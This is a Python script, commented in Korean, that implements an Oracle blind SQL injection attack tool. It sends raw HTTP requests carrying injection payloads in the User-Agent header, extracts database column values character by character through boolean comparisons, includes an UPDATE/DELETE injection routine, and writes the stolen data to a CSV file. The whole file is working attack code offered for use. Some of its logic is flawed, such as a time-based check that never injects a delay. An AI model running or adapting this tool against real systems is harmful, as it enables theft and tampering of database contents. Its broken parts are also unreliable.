import socket
import time
import csv
from datetime import datetime

class OracleBlindSQLInjector:
    def __init__(self, target_params):
        # 타겟 정보 설정
        self.server = target_params['server']
        self.port = target_params['port']
        self.index = target_params['index']
        self.delay = target_params['delay']
        self.threshold = target_params['threshold']
        self.retries = target_params['retries']
        self.success_payloads = []
        self.failure_payloads = []

    def baseline(self):
        '''서버의 기본 응답 시간을 측정하여 기준으로 사용'''
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server, self.port))
                start = time.time()
                s.sendall(f"GET / HTTP/1.1\r\nHost: {self.server}\r\n\r\n".encode())
                s.recv(100)
                return time.time() - start
        except Exception as e:
            print("기본 응답 시간 측정 실패:", e)
            exit()

    def time_based_blind_injection(self, query, sleep_time):
        '''타임 기반 블라인드 SQL 인젝션'''
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server, self.port))
                start = time.time()
                payload = f"{query} AND 1=1--"
                request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {payload}\r\n\r\n"
                s.sendall(request.encode())
                s.recv(100)
                elapsed = time.time() - start
                if elapsed > sleep_time:
                    print(f"✅ 시간 기반 인젝션 성공: {query}")
                    return True
                else:
                    return False
        except Exception as e:
            print("서버 연결 실패:", e)
            return False

    def boolean_based_blind_injection(self, true_query, false_query):
        '''Boolean 기반 블라인드 SQL 인젝션'''
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server, self.port))
                true_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {true_query}\r\n\r\n"
                s.sendall(true_request.encode())
                true_response = s.recv(100)
                
                false_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {false_query}\r\n\r\n"
                s.sendall(false_request.encode())
                false_response = s.recv(100)

                if true_response != false_response:
                    print(f"✅ Boolean 기반 인젝션 성공: {true_query}")
                    return True
                else:
                    return False
        except Exception as e:
            print("Boolean 기반 인젝션 실패:", e)
            return False

    def extract_data(self, table_name, column_name):
        '''테이블 내의 데이터를 하나씩 추출'''
        extracted_data = ""
        for i in range(1, 21):  # 데이터 길이 추정, 최대 20 문자
            char_extracted = False
            for ascii_code in range(32, 127):  # ASCII 범위
                query_true = f"' AND ASCII(SUBSTR((SELECT {column_name} FROM {table_name} WHERE ROWNUM=1), {i}, 1)) = {ascii_code}--"
                query_false = f"' AND ASCII(SUBSTR((SELECT {column_name} FROM {table_name} WHERE ROWNUM=1), {i}, 1)) != {ascii_code}--"
                
                if self.boolean_based_blind_injection(query_true, query_false):
                    extracted_data += chr(ascii_code)
                    print(f"{column_name}에서 {i}번째 문자 추출 성공: '{chr(ascii_code)}'")
                    char_extracted = True
                    break
            
            if not char_extracted:  # 모든 ASCII 값을 확인했음에도 결과가 없으면 종료
                print(f"{column_name}의 데이터가 더 이상 추출되지 않습니다. 데이터 끝에 도달했습니다.")
                break
        return extracted_data

    def non_select_sqli_attack(self, update_query, check_column, expected_value):
        '''UPDATE/DELETE 구간에서 데이터 무결성을 유지하는 공격 방법'''
        try:
            payload = f"{update_query} AND {check_column}='{expected_value}'"
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server, self.port))
                request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {payload}\r\n\r\n"
                s.sendall(request.encode())
                response = s.recv(100)
                if expected_value.encode() in response:
                    print("✅ 비SELECT 기반 인젝션 성공")
                    return True
                else:
                    print("❌ 비SELECT 인젝션 실패")
                    return False
        except Exception as e:
            print("비SELECT 인젝션 실패:", e)
            return False

    def run(self):
        '''Blind SQL Injection 공격 시작 및 데이터 추출'''
        table_name = "YOUR_TABLE_NAME"
        column_name = "YOUR_COLUMN_NAME"
        
        baseline_time = self.baseline()
        print(f"기본 응답 시간: {baseline_time:.2f}초")
        
        extracted_result = self.extract_data(table_name, column_name)
        if extracted_result:
            print(f"{column_name} 추출 결과: {extracted_result}")
            self.save_results(extracted_result)
        else:
            print(f"{column_name}의 데이터를 추출하지 못했습니다.")

    def save_results(self, result):
        '''결과를 CSV 파일로 저장'''
        filename = f"blind_sql_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        try:
            with open(filename, mode='w', newline='', encoding='utf-8-sig') as file:
                writer = csv.writer(file)
                writer.writerow(["테이블명", "컬럼명", "추출 데이터"])
                writer.writerow(["YOUR_TABLE_NAME", "YOUR_COLUMN_NAME", result])
            print(f"데이터가 {filename} 파일에 저장되었습니다.")
        except Exception as e:
            print("결과 저장 중 오류 발생:", e)

# 실제 공격 대상 파라미터
target_params = {
    'server': 'localhost',
    'port': 8080,
    'index': 1,
    'delay': 1,
    'threshold': 0.5,
    'retries': 5
}

if __name__ == "__main__":
    injector = OracleBlindSQLInjector(target_params)
    print("DBMS에서 블라인드 SQL 인젝션 공격을 시작합니다...")
    injector.run()
    print("블라인드 SQL 인젝션 공격이 완료되었습니다.")
